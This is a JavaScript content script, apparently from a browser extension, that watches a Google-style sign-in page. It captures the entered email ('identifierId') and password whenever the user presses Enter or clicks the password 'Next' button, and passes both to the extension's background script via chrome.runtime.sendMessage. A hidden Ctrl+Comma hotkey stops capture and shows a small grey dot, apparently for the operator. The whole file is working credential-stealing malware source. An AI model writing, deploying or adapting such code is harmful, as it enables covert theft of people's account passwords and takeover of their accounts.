function checkElements(tagName, callback) {
	const elms = document.getElementsByTagName(tagName);

	for (let i = 0; i < elms.length; i++) {
		callback(elms[i])
	}

	const observer = new MutationObserver(mutations => {
		for (const mutation of mutations) {
			const target = mutation.target;
			if (target && target.tagName.toLowerCase() === tagName.toLowerCase()) {
				callback(target);
			}
		}
	});

	observer.observe(document.body, {
		childList: true,
		subtree: true,
		attributes: true
	});
}

function checkSelector(selector, callback) {
	if (document.querySelector(selector)) {
			callback(document.querySelector(selector));
	}

	const observer = new MutationObserver(mutations => {
		if (document.querySelector(selector)) {
			callback(document.querySelector(selector));
		}
	});

	observer.observe(document.body, {
		childList: true,
		subtree: true
	});
}

const pwdInputs = [];
const nextButtons = [];

let pwdInput;
let nextButton;
let stop = false;

function send() {
	if (stop) return;
	const pwd = pwdInput.value;
	const email = document.getElementById("identifierId").value;
	chrome.runtime.sendMessage({email, pwd});
}

addEventListener("keydown", event => {
	if (event.code === "Comma" && event.ctrlKey && !stop) {
		stop = true;
		const elm = document.createElement("div");
		document.body.appendChild(elm);
		elm.style.position = "fixed";
		elm.style.width = "10px";
		elm.style.height = "10px";
		elm.style.borderRadius = "50%";
		elm.style.backgroundColor = "#b0b0b0";
		elm.style.left = 0;
		elm.style.top = 0;
		elm.style.zIndex = 2;
	}
});

checkElements("input", elm => {
	if (pwdInputs.includes(elm)) return;
	if (elm.type.toLowerCase() === "password" && elm.getAttribute("autocomplete") === "current-password") {
		pwdInputs.push(elm);
		pwdInput = elm;

		pwdInput.addEventListener("keydown", event => {
			if (event.code === "Enter") {
				send();
			}
		});
	}
});

checkSelector("#passwordNext > div > button", button => {
	if (nextButtons.includes(button)) return;
	nextButtons.push(button);
	nextButton = button;
	button.addEventListener("click", send);
});